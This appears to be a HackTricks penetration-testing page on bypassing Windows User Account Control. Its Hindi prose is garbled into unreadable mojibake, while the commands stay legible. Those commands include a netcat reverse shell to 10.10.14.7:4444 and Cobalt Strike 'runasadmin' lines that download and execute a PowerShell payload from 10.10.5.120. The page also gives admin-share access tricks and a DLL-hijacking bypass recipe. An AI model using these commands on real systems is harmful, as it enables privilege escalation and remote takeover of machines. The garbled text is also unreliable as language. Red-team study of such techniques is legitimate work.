UAC рдмрд╛рдпрдкрд╛рд╕ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдЖрд╡рд╢реНрдпрдХ рд╣реИ: **UAC рд╕рдХреНрд░рд┐рдп рд╣реИ, рдЖрдкрдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдордзреНрдпрдо рдЕрдЦрдВрдбрддрд╛ рд╕рдВрджрд░реНрдн рдореЗрдВ рдЪрд▓ рд░рд╣реА рд╣реИ, рдФрд░ рдЖрдкрдХрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░рд╢рд╛рд╕рдХ рд╕рдореВрд╣ рдХрд╛ рд╕рджрд╕реНрдп рд╣реИ**ред

рдпрд╣ рдЙрд▓реНрд▓реЗрдЦ рдХрд░рдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ рдпрджрд┐ UAC рд╕рдмрд╕реЗ рдЙрдЪреНрдЪ рд╕реБрд░рдХреНрд╖рд╛ рд╕реНрддрд░ (рд╣рдореЗрд╢рд╛) рдореЗрдВ рд╣реИ, рддреЛ рдЗрд╕реЗ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдирд╛ рдмрд╣реБрдд рдХрдард┐рди рд╣реИ рдмрдЬрд╛рдп рдЗрд╕рдХреЗ рдХрд┐ рдпрд╣ рдХрд┐рд╕реА рдЕрдиреНрдп рд╕реНрддрд░ (рдбрд┐рдлрд╝реЙрд▓реНрдЯ) рдореЗрдВ рд╣реЛред

### UAC рдЕрдХреНрд╖рдо

рдпрджрд┐ UAC рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдЕрдХреНрд╖рдо рд╣реИ (`ConsentPromptBehaviorAdmin` **`0`** рд╣реИ) рддреЛ рдЖрдк **рдПрдбрдорд┐рди рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдПрдХ рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** (рдЙрдЪреНрдЪ рдЕрдЦрдВрдбрддрд╛ рд╕реНрддрд░) рдЬреИрд╕реЗ рдХреБрдЫ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC рдХреЗ рд╕рд╛рде рдЯреЛрдХрди рдбреБрдкреНрд▓рд┐рдХреЗрд╢рди

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **рдмрд╣реБрдд** рдмреБрдирд┐рдпрд╛рджреА UAC "bypass" (рдкреВрд░реА рдлрд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдПрдХреНрд╕реЗрд╕)

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ рд╢реЗрд▓ рд╣реИ рдЬреЛ рдПрдбрдорд┐рдирд┐рд╕реНрдЯреНрд░реЗрдЯрд░реНрд╕ рд╕рдореВрд╣ рдХреЗ рдЕрдВрджрд░ рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╕рд╛рде рд╣реИ, рддреЛ рдЖрдк **C$ рдХреЛ рдорд╛рдЙрдВрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреЛ SMB (рдлрд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рд╛рдЭрд╛ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рд╕реНрдерд╛рдиреАрдп рд░реВрдк рдореЗрдВ рдПрдХ рдирдИ рдбрд┐рд╕реНрдХ рдореЗрдВ рдФрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ **рдлрд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдЕрдВрджрд░ рд╕рдм рдХреБрдЫ рддрдХ рдкрд╣реБрдБрдЪ рд╣реЛрдЧреА** (рдпрд╣рд╛рдБ рддрдХ рдХрд┐ рдПрдбрдорд┐рдирд┐рд╕реНрдЯреНрд░реЗрдЯрд░ рд╣реЛрдо рдлреЛрд▓реНрдбрд░ рднреА).

{% hint style="warning" %}
**рд▓рдЧрддрд╛ рд╣реИ рдпрд╣ рдЪрд╛рд▓ рдЕрдм рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд░рд╣реА рд╣реИ**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### рдХреЛрдмрд╛рд▓реНрдЯ рд╕реНрдЯреНрд░рд╛рдЗрдХ рдХреЗ рд╕рд╛рде UAC рдмрд╛рдИрдкрд╛рд╕

рдХреЛрдмрд╛рд▓реНрдЯ рд╕реНрдЯреНрд░рд╛рдЗрдХ рддрдХрдиреАрдХреЗрдВ рдХреЗрд╡рд▓ рддрднреА рдХрд╛рдо рдХрд░реЗрдВрдЧреА рдЬрдм UAC рдЕрдкрдиреЗ рдЕрдзрд┐рдХрддрдо рд╕реБрд░рдХреНрд╖рд╛ рд╕реНрддрд░ рдкрд░ рд╕реЗрдЯ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** рдФрд░ **Metasploit** рдореЗрдВ **UAC** рдХреЛ **bypass** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдИ рдореЙрдбреНрдпреВрд▓ рд╣реИрдВред

### KRBUACBypass

рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдФрд░ рдЯреВрд▓ [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass) рдкрд░ рдЙрдкрд▓рдмреНрдз рд╣реИрдВред

### UAC bypass рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреНрд╕

[**UACME**](https://github.com/hfiref0x/UACME) рдЬреЛ рдХрдИ UAC bypass рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреНрд╕ рдХрд╛ **рд╕рдВрдХрд▓рди** рд╣реИред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрдкрдХреЛ **UACME рдХреЛ visual studio рдпрд╛ msbuild рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрдВрдкрд╛рдЗрд▓** рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред рдХрдВрдкрд╛рдЗрд▓реЗрд╢рди рд╕реЗ рдХрдИ рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓реНрд╕ рдмрдиреЗрдВрдЧреЗ (рдЬреИрд╕реЗ `Source\Akagi\outout\x64\Debug\Akagi.exe`), рдЖрдкрдХреЛ рдкрддрд╛ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП **рдХрд┐ рдЖрдкрдХреЛ рдХреМрди рд╕рд╛ рдЪрд╛рд╣рд┐рдПред**\
рдЖрдкрдХреЛ **рд╕рд╛рд╡рдзрд╛рди рд░рд╣рдирд╛ рдЪрд╛рд╣рд┐рдП** рдХреНрдпреЛрдВрдХрд┐ рдХреБрдЫ bypasses **рдХреБрдЫ рдЕрдиреНрдп рдкреНрд░реЛрдЧреНрд░рд╛рдореНрд╕ рдХреЛ рдкреНрд░реЙрдореНрдкреНрдЯ рдХрд░реЗрдВрдЧреЗ** рдЬреЛ **рдпреВрдЬрд░** рдХреЛ рдЕрд▓рд░реНрдЯ рдХрд░реЗрдВрдЧреЗ рдХрд┐ рдХреБрдЫ рд╣реЛ рд░рд╣рд╛ рд╣реИред

UACME рдореЗрдВ **рд╡рд╣ рдмрд┐рд▓реНрдб рд╡рд░реНрдЬрди рд╣реИ рдЬрд┐рд╕рд╕реЗ рдкреНрд░рддреНрдпреЗрдХ рддрдХрдиреАрдХ рдХрд╛рдо рдХрд░рдирд╛ рд╢реБрд░реВ рд╣реБрдИ**ред рдЖрдк рдЕрдкрдиреЗ рд╡рд░реНрдЬрдиреНрд╕ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓реА рддрдХрдиреАрдХ рдХреА рдЦреЛрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
#### рдФрд░ UAC рдмрд╛рдпрдкрд╛рд╕

**рд╕рднреА** рддрдХрдиреАрдХреЗрдВ рдЬреЛ рдпрд╣рд╛рдБ AUC рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реНрддреЗрдорд╛рд▓ рдХреА рдЧрдИ рд╣реИрдВ, рдЙрдиреНрд╣реЗрдВ **рдкреВрд░реНрдг рдЗрдВрдЯрд░реИрдХреНрдЯрд┐рд╡ рд╢реЗрд▓** рдХреА **рдЖрд╡рд╢реНрдпрдХрддрд╛** рд╣реЛрддреА рд╣реИ рдЬреЛ рдкреАрдбрд╝рд┐рдд рдХреЗ рд╕рд╛рде рд╣реЛ (рдПрдХ рд╕рд╛рдорд╛рдиреНрдп nc.exe рд╢реЗрд▓ рдкрд░реНрдпрд╛рдкреНрдд рдирд╣реАрдВ рд╣реИ)ред

рдЖрдк **рдореАрдЯрд░рдкреНрд░реАрдЯрд░** рд╕рддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдПрдХ **рдкреНрд░рдХреНрд░рд┐рдпрд╛** рдореЗрдВ рдорд╛рдЗрдЧреНрд░реЗрдЯ рдХрд░реЗрдВ рдЬрд┐рд╕рдХрд╛ **рд╕реЗрд╢рди** рдорд╛рди **1** рдХреЗ рдмрд░рд╛рдмрд░ рд╣реЛ:

![](<../../.gitbook/assets/image (96).png>)

(_explorer.exe_ рдХрд╛рдо рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП)

### UAC рдмрд╛рдпрдкрд╛рд╕ GUI рдХреЗ рд╕рд╛рде

рдЕрдЧрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ **GUI** рддрдХ рдкрд╣реБрдБрдЪ рд╣реИ рддреЛ рдЖрдк рдЬрдм UAC рдкреНрд░реЙрдореНрдкреНрдЯ рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдмрд╕ рдЙрд╕реЗ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЖрдкрдХреЛ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдЗрд╕реЗ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреА рдЬрд░реВрд░рдд рдирд╣реАрдВ рд╣реИред рдЗрд╕рд▓рд┐рдП, GUI рддрдХ рдкрд╣реБрдБрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рд╕реЗ рдЖрдк UAC рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЕрдЧрд░ рдЖрдкрдХреЛ рдХрд┐рд╕реА GUI рд╕рддреНрд░ рддрдХ рдкрд╣реБрдБрдЪ рдорд┐рд▓рддреА рд╣реИ рдЬрд┐рд╕реЗ рдХреЛрдИ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рдерд╛ (рд╕рдВрднрд╡рддрдГ RDP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ) рддреЛ рдХреБрдЫ рдЯреВрд▓реНрд╕ рд╣реЛрдВрдЧреЗ рдЬреЛ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдПрдбрдорд┐рдирд┐рд╕реНрдЯреНрд░реЗрдЯрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓ рд░рд╣реЗ рд╣реЛрдВрдЧреЗ рдЬрд╣рд╛рдБ рд╕реЗ рдЖрдк рд╕реАрдзреЗ **cmd** рдХреЛ **рдПрдбрдорд┐рди** рдХреЗ рд░реВрдк рдореЗрдВ **рдЪрд▓рд╛** рд╕рдХрддреЗ рд╣реИрдВ рдмрд┐рдирд╛ UAC рджреНрд╡рд╛рд░рд╛ рдлрд┐рд░ рд╕реЗ рдкреНрд░реЙрдореНрдкреНрдЯ рдХрд┐рдП рдЬрд╛рдиреЗ рдХреЗ рдЬреИрд╕реЗ [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)ред рдпрд╣ рдереЛрдбрд╝рд╛ рдЕрдзрд┐рдХ **рдЪреБрдкрдХреЗ** рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

### рд╢реЛрд░рдЧреБрд▓ рд╡рд╛рд▓рд╛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ UAC рдмрд╛рдпрдкрд╛рд╕

рдЕрдЧрд░ рдЖрдкрдХреЛ рд╢реЛрд░рдЧреБрд▓ рдХреА рдкрд░рд╡рд╛рд╣ рдирд╣реАрдВ рд╣реИ рддреЛ рдЖрдк рд╣рдореЗрд╢рд╛ [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) рдЬреИрд╕рд╛ рдХреБрдЫ **рдЪрд▓рд╛** рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ рдЕрдиреБрдорддрд┐ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣рддрд╛ рд╣реИ рдЬрдм рддрдХ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрд╕реЗ рд╕реНрд╡реАрдХрд╛рд░ рдирд╣реАрдВ рдХрд░рддрд╛**ред

### рдЖрдкрдХрд╛ рдЦреБрдж рдХрд╛ рдмрд╛рдпрдкрд╛рд╕ - рдмреЗрд╕рд┐рдХ UAC рдмрд╛рдпрдкрд╛рд╕ рдкрджреНрдзрддрд┐

рдЕрдЧрд░ рдЖрдк **UACME** рдХреЛ рджреЗрдЦреЗрдВрдЧреЗ рддреЛ рдЖрдк рдиреЛрдЯ рдХрд░реЗрдВрдЧреЗ рдХрд┐ **рдЕрдзрд┐рдХрд╛рдВрд╢ UAC рдмрд╛рдпрдкрд╛рд╕ Dll Hijacking рднреЗрджреНрдпрддрд╛ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ** (рдореБрдЦреНрдп рд░реВрдк рд╕реЗ _C:\Windows\System32_ рдкрд░ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг dll рд▓рд┐рдЦрдХрд░)ред [Dll Hijacking рднреЗрджреНрдпрддрд╛ рдХреЛ рдХреИрд╕реЗ рдЦреЛрдЬреЗрдВ рдЗрд╕реЗ рдкрдврд╝реЗрдВ](../windows-local-privilege-escalation/dll-hijacking.md)ред

1. рдПрдХ рдмрд╛рдЗрдирд░реА рдЦреЛрдЬреЗрдВ рдЬреЛ **рдСрдЯреЛрдПрд▓рд┐рд╡реЗрдЯ** рдХрд░реЗрдЧреА (рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдЬрдм рдпрд╣ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддреА рд╣реИ рддреЛ рдпрд╣ рдЙрдЪреНрдЪ рдЕрдЦрдВрдбрддрд╛ рд╕реНрддрд░ рдкрд░ рдЪрд▓рддреА рд╣реИ)ред
2. рдкреНрд░реЛрдХрдореЙрди рдХреЗ рд╕рд╛рде "**NAME NOT FOUND**" рдЗрд╡реЗрдВрдЯреНрд╕ рдЦреЛрдЬреЗрдВ рдЬреЛ **DLL Hijacking** рдХреЗ рд▓рд┐рдП рднреЗрджреНрдп рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред
3. рдЖрдкрдХреЛ рд╢рд╛рдпрдж DLL рдХреЛ рдХреБрдЫ **рд╕реБрд░рдХреНрд╖рд┐рдд рдкрдереЛрдВ** рдореЗрдВ **рд▓рд┐рдЦрдиреЗ** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА (рдЬреИрд╕реЗ C:\Windows\System32) рдЬрд╣рд╛рдБ рдЖрдкрдХреЗ рдкрд╛рд╕ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИред рдЗрд╕реЗ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
   1. **wusa.exe**: Windows 7,8 рдФрд░ 8.1ред рдпрд╣ рд╕реБрд░рдХреНрд╖рд┐рдд рдкрдереЛрдВ рдХреЗ рдЕрдВрджрд░ CAB рдлрд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдирд┐рдХрд╛рд▓рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ (рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдЯреВрд▓ рдЙрдЪреНрдЪ рдЕрдЦрдВрдбрддрд╛ рд╕реНрддрд░ рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддрд╛ рд╣реИ)ред
   2. **IFileOperation**: Windows 10ред
4. рд╕реБрд░рдХреНрд╖рд┐рдд рдкрде рдХреЗ рдЕрдВрджрд░ рдЕрдкрдиреЗ DLL рдХреЛ рдХреЙрдкреА рдХрд░рдиреЗ рдФрд░ рднреЗрджреНрдп рдФрд░ рдСрдЯреЛрдПрд▓рд┐рд╡реЗрдЯреЗрдб рдмрд╛рдЗрдирд░реА рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ **рд╕реНрдХреНрд░рд┐рдкреНрдЯ** рддреИрдпрд╛рд░ рдХрд░реЗрдВред

### рдПрдХ рдФрд░ UAC рдмрд╛рдпрдкрд╛рд╕ рддрдХрдиреАрдХ

рдЗрд╕рдореЗрдВ рджреЗрдЦрдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдПрдХ **рдСрдЯреЛрдПрд▓рд┐рд╡реЗрдЯреЗрдб рдмрд╛рдЗрдирд░реА** **рд░рдЬрд┐рд╕реНрдЯреНрд░реА** рд╕реЗ рдПрдХ **рдмрд╛рдЗрдирд░реА** рдпрд╛ **рдХрдорд╛рдВрдб** рдХреЗ **рдирд╛рдо/рдкрде** рдХреЛ **рдкрдврд╝рдиреЗ** рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреА рд╣реИ рдЬрд┐рд╕реЗ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рд╣реИ (рдпрд╣ рдЕрдзрд┐рдХ рд░реЛрдЪрдХ рд╣реИ рдЕрдЧрд░ рдмрд╛рдЗрдирд░реА рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ **HKCU** рдХреЗ рдЕрдВрджрд░ рдЦреЛрдЬрддреА рд╣реИ)ред

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрд╕рд╛рдиреА рд╕реЗ рджреБрдирд┐рдпрд╛ рдХреЗ **рд╕рдмрд╕реЗ рдЙрдиреНрдирдд** рд╕рдореБрджрд╛рдп рдЯреВрд▓реНрд╕ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд **рд╡рд░реНрдХрдлреНрд▓реЛрдЬрд╝ рдХреЛ рдмрд┐рд▓реНрдб рдФрд░ рдСрдЯреЛрдореЗрдЯ** рдХрд░реЗрдВред\
рдЖрдЬ рд╣реА рдкрд╣реБрдБрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) рдХреЗ рд╕рд╛рде рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong>!</summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) **рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ**ред
* **HackTricks** рдХреЗ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
